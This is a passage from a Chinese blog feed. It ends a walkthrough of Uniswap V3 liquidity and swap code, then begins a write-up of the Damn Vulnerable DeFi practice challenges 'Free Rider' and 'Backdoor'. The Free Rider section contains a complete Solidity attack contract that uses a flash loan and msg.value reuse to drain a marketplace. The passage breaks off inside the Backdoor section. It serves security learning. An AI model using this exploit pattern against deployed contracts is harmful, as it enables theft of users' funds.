ModifyPositionParams(&#123;</span><br><span class="line">                owner: recipient,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 &#x3D; uint256(amount0Int);</span><br><span class="line">    amount1 &#x3D; uint256(amount1Int);</span><br><span class="line"></span><br><span class="line">    uint256 balance0Before;</span><br><span class="line">    uint256 balance1Before;</span><br><span class="line">    &#x2F;&#x2F; 获取当前池中的 x token, y token 余额</span><br><span class="line">    if (amount0 &gt; 0) balance0Before &#x3D; balance0();</span><br><span class="line">    if (amount1 &gt; 0) balance1Before &#x3D; balance1();</span><br><span class="line">    &#x2F;&#x2F; 将需要的 x token 和 y token 数量传给回调函数，这里预期回调函数会将指定数量的 token 发送到合约中</span><br><span class="line">    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);</span><br><span class="line">    &#x2F;&#x2F; 回调完成后，检查发送至合约的 token 是否复合预期，如果不满足检查则回滚交易</span><br><span class="line">    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;&#x3D; balance0(), &#39;M0&#39;);</span><br><span class="line">    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;&#x3D; balance1(), &#39;M1&#39;);</span><br><span class="line"></span><br><span class="line">    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个函数关键的步骤就是通过回调函数，让调用方发送指定数量的 x token 和 y token 至合约中。</p><p>再来看<code>NonfungiblePositionManager.mint</code>的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">function mint(MintParams calldata params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    IUniswapV3Pool pool;</span><br><span class="line">    &#x2F;&#x2F; 这里是添加流动性，并完成 x token 和 y token 的发送</span><br><span class="line">    (amount0, amount1, pool) &#x3D; addLiquidity(</span><br><span class="line">        AddLiquidityParams(&#123;</span><br><span class="line">            token0: params.token0,</span><br><span class="line">            token1: params.token1,</span><br><span class="line">            fee: params.fee,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            tickLower: params.tickLower,</span><br><span class="line">            tickUpper: params.tickUpper,</span><br><span class="line">            amount: params.amount,</span><br><span class="line">            amount0Max: params.amount0Max,</span><br><span class="line">            amount1Max: params.amount1Max</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 铸造 ERC721 token 给用户，用来代表用户所持有的流动性</span><br><span class="line">    _mint(params.recipient, (tokenId &#x3D; _nextId++));</span><br><span class="line"></span><br><span class="line">    bytes32 positionKey &#x3D; PositionKey.compute(address(this), params.tickLower, params.tickUpper);</span><br><span class="line">    (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) &#x3D; pool.positions(positionKey);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; idempotent set</span><br><span class="line">    uint80 poolId &#x3D;</span><br><span class="line">        cachePoolKey(</span><br><span class="line">            address(pool),</span><br><span class="line">            PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 用 ERC721 的 token ID 作为键，将用户提供流动性的元信息保存起来</span><br><span class="line">    _positions[tokenId] &#x3D; Position(&#123;</span><br><span class="line">        nonce: 0,</span><br><span class="line">        operator: address(0),</span><br><span class="line">        poolId: poolId,</span><br><span class="line">        tickLower: params.tickLower,</span><br><span class="line">        tickUpper: params.tickUpper,</span><br><span class="line">        liquidity: params.amount,</span><br><span class="line">        feeGrowthInside0LastX128: feeGrowthInside0LastX128,</span><br><span class="line">        feeGrowthInside1LastX128: feeGrowthInside1LastX128,</span><br><span class="line">        tokensOwed0: 0,</span><br><span class="line">        tokensOwed1: 0</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到这个函数主要是将用户的 Position 保存起来，并给用户铸造 NFT token，代表其所持有的流动性。至此提供流动性的步骤就完成了。</p><h4 id="流动性的移除"><a href="#流动性的移除" class="headerlink" title="流动性的移除"></a>流动性的移除</h4><p>流动性的移除其实就是上述操作的逆操作，在<code>burn</code>函数中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function burn(</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    &#x2F;&#x2F; 先计算出需要移除的 token 数</span><br><span class="line">    (Position.Info storage position, int256 amount0Int, int256 amount1Int) &#x3D;</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: msg.sender,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: -int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 &#x3D; uint256(-amount0Int);</span><br><span class="line">    amount1 &#x3D; uint256(-amount1Int);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 注意这里，移除流动性后，将移出的 token 数记录到了 position.tokensOwed 上</span><br><span class="line">    if (amount0 &gt; 0 || amount1 &gt; 0) &#123;</span><br><span class="line">        (position.tokensOwed0, position.tokensOwed1) &#x3D; (</span><br><span class="line">            position.tokensOwed0 + uint128(amount0),</span><br><span class="line">            position.tokensOwed1 + uint128(amount1)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="交易过程"><a href="#交易过程" class="headerlink" title="交易过程"></a>交易过程</h3><p>v3 的<code>UniswapV3Pool</code>提供了比较底层的交易接口，而在<code>SwapRouter</code>合约中封装了面向用户的交易接口：</p><ul><li><strong>exactInput:</strong> 指定交易对路径，付出的 x token 数和预期得到的最小 y token 数（x, y 可以互换）</li><li><strong>exactOutput:</strong> 指定交易路径，付出的 x token 最大数和预期得到的 y token 数（x, y 可以互换）</li></ul><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>关于上文提到的交易路径，在进行两个代币交易时，是首先需要在链下计算出交易的路径，例如使用<code>ETH -&gt; DAI</code>：</p><ul><li>可以直接通过<code>ETH/DAI</code>的交易池完成</li><li>也可以通过<code>ETH -&gt; USDC -&gt; DAI</code>路径，即经过<code>ETH/USDC</code>, <code>USDC/DAI</code>两个交易池完成交易</li></ul><p>Uniswap 的前端会帮用户实时计算出最优路径（即交易的收益最高），作为参数传给合约调用。前端中这部分计算的具体实现在这里，具体过程为先用需要交易的输入代币，输出代币，以及一系列可用的中间代币（代码中叫 Base token）生成所有的路径（当然为了降低复杂度，路径中最多包含3个代币），然后遍历每个路径输出的输出代币数量，最后选取最佳路径.<br>事实上因为 v3 引入了费率的原因，在路径选择的过程中还需要考虑费率的因素。</p><h3 id="交易入口"><a href="#交易入口" class="headerlink" title="交易入口"></a>交易入口</h3><p>交易入口是<code>exactInput</code>函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">struct ExactInputParams &#123;</span><br><span class="line">    bytes path;                 &#x2F;&#x2F; 路径</span><br><span class="line">    address recipient;          &#x2F;&#x2F; 收款地址</span><br><span class="line">    uint256 deadline;           &#x2F;&#x2F; 交易有效期</span><br><span class="line">    uint256 amountIn;           &#x2F;&#x2F; 输入的 token 数（输入的 token 地址就是 path 中的第一个地址）</span><br><span class="line">    uint256 amountOutMinimum;   &#x2F;&#x2F; 预期交易最少获得的 token 数（获得的 token 地址就是 path 中最后一个地址）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function exactInput(ExactInputParams memory params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (uint256 amountOut)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过循环，遍历传入的路径，进行交易</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        bool hasPools &#x3D; params.path.hasPools();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 完成当前路径的交易</span><br><span class="line">        params.amountIn &#x3D; exactInputSingle(</span><br><span class="line">            params.amountIn,</span><br><span class="line">            &#x2F;&#x2F; 如果是中间交易，又合约代为收取和支付中间代币</span><br><span class="line">            hasPools ? address(this) : params.recipient,</span><br><span class="line">            &#x2F;&#x2F; 给回调函数用的参数</span><br><span class="line">            SwapData(&#123;</span><br><span class="line">                path: params.path.getFirstPool(),</span><br><span class="line">                payer: msg.sender</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果路径全部遍历完成，则退出循环，交易完成</span><br><span class="line">        if (hasPools) &#123;</span><br><span class="line">            &#x2F;&#x2F; 步进 path 中的值</span><br><span class="line">            params.path &#x3D; params.path.skipToken();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amountOut &#x3D; params.amountIn;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 检查交易是否满足预期</span><br><span class="line">    require(amountOut &gt;&#x3D; params.amountOutMinimum, &#39;Too little received&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="路径的编码"><a href="#路径的编码" class="headerlink" title="路径的编码"></a>路径的编码</h4><p>细心看的话其实可以知道上面输入的参数中 <code>path</code> 字段是 <code>bytes</code> 类型，通过这样可以实现更加紧凑的编码。Uniswap会将<code>bytes</code>作为一个数组使用，bytes类型就是一连串的<code>byte1</code>,因此相比普通数组其结构更加紧凑。在 Uniswap V3 中 <code>path</code>内部编码结构如下图：</p><p>![]path_encode.jpg)</p><p>图中展示了一个包含 2个路径（pool0, 和 pool1）的 path 编码。Uniswap 将编码解码操作封装在了 <code>Path</code> 库中，本文不再赘述其过程。每次交易时，会取出头部的 <code>tokenIn</code>, <code>tokenOut</code>, <code>fee</code>，使用这三个参数找到对应的交易池，完成交易。</p><h4 id="单个池的交易过程"><a href="#单个池的交易过程" class="headerlink" title="单个池的交易过程"></a>单个池的交易过程</h4><p>单个池的交易在 <code>exactInputSingle</code> 函数中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function exactInputSingle(</span><br><span class="line">    uint256 amountIn,</span><br><span class="line">    address recipient,</span><br><span class="line">    SwapData memory data</span><br><span class="line">) private returns (uint256 amountOut) &#123;</span><br><span class="line">    &#x2F;&#x2F; 将 path 解码，获取头部的 tokenIn, tokenOut, fee</span><br><span class="line">    (address tokenIn, address tokenOut, uint24 fee) &#x3D; data.path.decodeFirstPool();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 因为交易池只保存了 token x 的价格，这里我们需要知道输入的 token 是交易池 x token 还是 y token</span><br><span class="line">    bool zeroForOne &#x3D; tokenIn &lt; tokenOut;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 完成交易</span><br><span class="line">    (int256 amount0, int256 amount1) &#x3D;</span><br><span class="line">        getPool(tokenIn, tokenOut, fee).swap(</span><br><span class="line">            recipient,</span><br><span class="line">            zeroForOne,</span><br><span class="line">            amountIn.toInt256(),</span><br><span class="line">            zeroForOne ? MIN_SQRT_RATIO : MAX_SQRT_RATIO,</span><br><span class="line">            &#x2F;&#x2F; 给回调函数用的参数</span><br><span class="line">            abi.encode(data)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    return uint256(-(zeroForOne ? amount1 : amount0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交易过程是先获取交易池，然后确定本次交易的输出是交易池的<code>token x</code>还是<code>token y</code></p><p>这是因为交易池中只保存了x的价格，所以<code>token x</code>和<code>token y</code>的计算公式是不一样的。最用再调用<code>UniswapV3Pool</code>的<code>swap</code>完成交易。</p><h4 id="交易分解"><a href="#交易分解" class="headerlink" title="交易分解"></a>交易分解</h4><p><code>UniswapV3Pool.swap</code> 函数比较长，这里简要描述其交易步骤：</p><p>假设支付的token为x，价格为：</p><script type="math/tex; mode=display">\sqrt(P) = \sqrt(\frac{y}{x} )</script><p><img src="swap.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Uniswap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uniswap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 10-11</title>
      <link href="/DamnDefi-10-11/"/>
      <url>/DamnDefi-10-11/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-10-11"><a href="#Damn-Defi靶场刷题记录-10-11" class="headerlink" title="Damn Defi靶场刷题记录(10-11)"></a>Damn Defi靶场刷题记录(10-11)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="10-Free-rider"><a href="#10-Free-rider" class="headerlink" title="10 Free rider"></a>10 Free rider</h2><p>这又是一道利用闪电贷来获取利益的题目。可见Defi平台要预防可能的闪电攻击是个难题。</p><p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p><h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a><strong>Code Review</strong></h3><p>首先我们从头来看这个Challenge</p><ul><li><p><strong>FreeRiderNFTMarketplace</strong><br>这是交易市场的合约,主要的功能就是商品的上架，买入等功能。</p><ul><li>offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)<blockquote><p>这是一个根据NFTid定价的函数，传入的参数分别是NFT的id数组和价格数组。</p></blockquote></li><li>buyMany(uint256[] calldata tokenIds) external payable<blockquote><p>这是购买指定id的NFT的函数。入参即NFT的id数组。<br>在阅读市场合约后，我产生一个疑惑”题目中要求市场合约损失一些ETH是怎么回事”，于是我立即又倒回去再次审查，看到<code>_buyOne</code>的时候立即让我警觉起来<br><img src="Damn10_1.png" alt=""><br>这里通过msg.value来检查发送的金额是否足够买下此NFT，看似没有问题，但是！<code>buyMany()</code>函数通过循环来调用了这个<code>_buyMany()</code>子函数，这样一组合，就导致这一流程出现重入的风险，我们只要一次调用<code>buyMany()</code>，那么在每次循环，我们的<code>msg.value</code>并不会发生变化。这意味着我们可以用一笔很少的钱买下市场上所有单价低于此金额的NFT。<br>这就是市场ETH减少的秘密！</p></blockquote></li></ul></li><li><p><strong>Exploit</strong><br>我们再来理一理思路，我们要做的是：</p><blockquote><p>1.先通过闪电贷借30ETH通过正规途径买入两个NFT<br>2.将买入的两个NFT以90ETH/个的价格出售<br>3.再通过闪电贷获得90ETH后，自己当买家，通过重入漏洞以90一个的价格买入两个NFT(消耗市场的余额)<br>4.还给闪电贷120个ETH后，自己赚取60个ETH正好可以买4余下的4个NFT</p></blockquote></li></ul><p>以此写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;.&#x2F;FreeRiderBuyer.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;FreeRiderNFTMarketplace.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableNFT.sol&quot;;</span><br><span class="line">import &quot;hardhat&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Callee &#123;</span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IWETH &#123;</span><br><span class="line">    function transfer(address recipient, uint256 amount) external returns (bool);</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IFreeRiderNFTMarketplace &#123;</span><br><span class="line">    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;</span><br><span class="line">    function buyMany(uint256[] calldata tokenIds) external payable;</span><br><span class="line">    function token() external returns (IERC721);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver &#123;</span><br><span class="line"></span><br><span class="line">address public attcker;</span><br><span class="line">address immutable buyer;</span><br><span class="line">IFreeRiderNFTMarketplace immutable market;</span><br><span class="line">IUniswapV2Pair immutable uniswapPair;</span><br><span class="line">IWETH immutable weth;</span><br><span class="line">IERC721 immutable nft;</span><br><span class="line"></span><br><span class="line">    constructor(address _Buyer, IFreeRiderNFTMarketplace _market, IWETH _token, IUniswapV2Pair _uniswapPair)&#123;</span><br><span class="line">        market &#x3D; _market;</span><br><span class="line">        buyer &#x3D; _Buyer;</span><br><span class="line">        attcker &#x3D; msg.sender;</span><br><span class="line">        uniswapPair &#x3D; _uniswapPair;</span><br><span class="line">        nft &#x3D; _market.token();</span><br><span class="line">        weth &#x3D; _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uniswapPair.swap(</span><br><span class="line">            120 ether,         &#x2F;&#x2F;根据分析，我们一共需要从闪电贷借120ETH</span><br><span class="line">            0 ,                &#x2F;&#x2F;我们不关心这个参数，因为我们只用借ETH</span><br><span class="line">            address(this),     &#x2F;&#x2F;借款发送到此合约</span><br><span class="line">            hex&quot;00&quot;            &#x2F;&#x2F;为了使data不为空（我们不关心此参数）</span><br><span class="line">        );           </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;闪电贷回调函数</span><br><span class="line">    function uniswapV2Call(address, uint, uint, bytes calldata) external override &#123;</span><br><span class="line">        console.log(&quot;success in line&quot;, 62);</span><br><span class="line">        &#x2F;&#x2F;通过闪电借的120 ether先提款到此合约</span><br><span class="line">        weth.withdraw(120 ether);</span><br><span class="line">        console.log(&quot;success in line&quot;, 65);</span><br><span class="line">        &#x2F;&#x2F;先买两个NFT</span><br><span class="line">        uint256[] memory tokenids1 &#x3D; new uint256[](2);</span><br><span class="line">        tokenids1[0] &#x3D; 0;</span><br><span class="line">        tokenids1[1] &#x3D; 1;</span><br><span class="line">        market.buyMany&#123;value: 30 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;以90的价格放入市场</span><br><span class="line">        nft.setApprovalForAll(address(market), true);</span><br><span class="line">        uint256[] memory price1 &#x3D; new uint256[](2);</span><br><span class="line">        price1[0] &#x3D; 90 ether;</span><br><span class="line">        price1[1] &#x3D; 90 ether;</span><br><span class="line">        market.offerMany(tokenids1, price1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;利用重入漏洞以90ether的价格买下这两个NFT</span><br><span class="line">        market.buyMany&#123;value:90 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;还款</span><br><span class="line">        uint256 fee &#x3D; ((120 ether * 3) &#x2F; uint256(997)) + 1;</span><br><span class="line">        weth.deposit&#123;value: 120 ether + fee&#125;();</span><br><span class="line">        weth.transfer(address(uniswapPair), 120 ether + fee);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用60ETH买4个NFT</span><br><span class="line">        tokenids1 &#x3D; new uint256[](4);</span><br><span class="line">        tokenids1[0] &#x3D; 2;</span><br><span class="line">        tokenids1[1] &#x3D; 3;</span><br><span class="line">        tokenids1[2] &#x3D; 4;</span><br><span class="line">        tokenids1[3] &#x3D; 5;</span><br><span class="line">        market.buyMany&#123;value:60 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;把六个nft都给buyer</span><br><span class="line">        for(uint8 tokenId &#x3D; 0; tokenId &lt; 6; tokenId++)&#123;</span><br><span class="line">            nft.safeTransferFrom(address(this), buyer, tokenId);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        payable(address(attcker)).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) &#123;</span><br><span class="line">        return IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>总结：在合约中重用相同的内容（通常通过循环或某种批处理/多调用函数）是一个非常重要的漏洞。</li></ul><h2 id="11-Backdoor"><a href="#11-Backdoor" class="headerlink" title="11 Backdoor"></a>11 Backdoor</h2><p>这个题我花费了大量的时间！因为需要对<code>GnosisSafe</code>Wallet的源码足够了解。在做这个挑战的时候又不停的在学习有关操作码的东西，这很麻烦。我必须说这个题是我目前做到的挑战里面比较折磨我的。<br>这个挑战的背景是<a href="https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol" target="_blank" rel="noopener">Gnosis安全钱包</a>,有人部署了钱包的注册表，当此团队中的人部署钱包时，他们将获得10个token，我们要做的就是拿到着40个token</p><h3 id="Code-Review-1"><a href="#Code-Review-1" class="headerlink" title="Code Review"></a><strong>Code Review</strong></h3><p>这个挑战只有一个注册表合约，但往往看似简单的东西都挺难的。</p><ul><li><strong>WalletRegistry</strong><br>注册表合约<ul><li>addBeneficiary()<br>添加受益人到注册表的函数,beneficiaries[]就是检测是否为注册表里有的地址</li><li>_removeBeneficiary()<br>在受益人收益后从注册表删除此受益人</li><li><strong>proxyCreated</strong><br>通过注释我们可以知道这是创建钱包时会调用的一个回调函数，而这个函数的作用就是给注册表中的受益人那10个token。</li></ul></li></ul><p>看起来，重头戏并不在这里，于是我把目光投向了<code>GnosisSafe</code>钱包的源码</p><ul><li><p><strong>GnosisSafe源码</strong><br>首先我们全局搜索回调<code>proxyCreated</code>的的地方，只有一个<code>createProxyWithCallback()</code>函数</p><ul><li><strong>GnosisSafeProxyFactory</strong> -createProxyWithCallback<br><img src="Damn10_CallBack.png" alt=""><br>入参有四个：<ol><li>address _singleton<br>这是一个单例地址</li><li>bytes memory initializer<br>这是初始化器的字节码，初始化函数其实就是<code>GnosisSafe</code>里的<code>setup()</code>函数</li><li>uint256 saltNonce<br>这是Create2里的随机数，我们不用关心</li><li>IProxyCreationCallback callback<br>这是回调合约的地址<br>我们直接关注回调的地方，<code>callback.proxyCreated(proxy, _singleton, initializer, saltNonce);</code>这里只是简单的一个回调，参数看上去也没有什么漏洞。<br>然后就是在上一行调用了<code>createProxyWithNonce</code>函数</li></ol></li><li><p><strong>GnosisSafeProxyFactory</strong> -createProxyWithNonce<br>这个函数内主要其实就是对initializer初始化函数的调用，只不过是用汇编实现的。<br>看起来关键可能在于<code>setup</code>函数</p></li><li><p><strong>GnosisSafe</strong> -setup<br>这是Gnosis钱包的一个初始化函数，我一眼就看到了<code>setupModules(to, 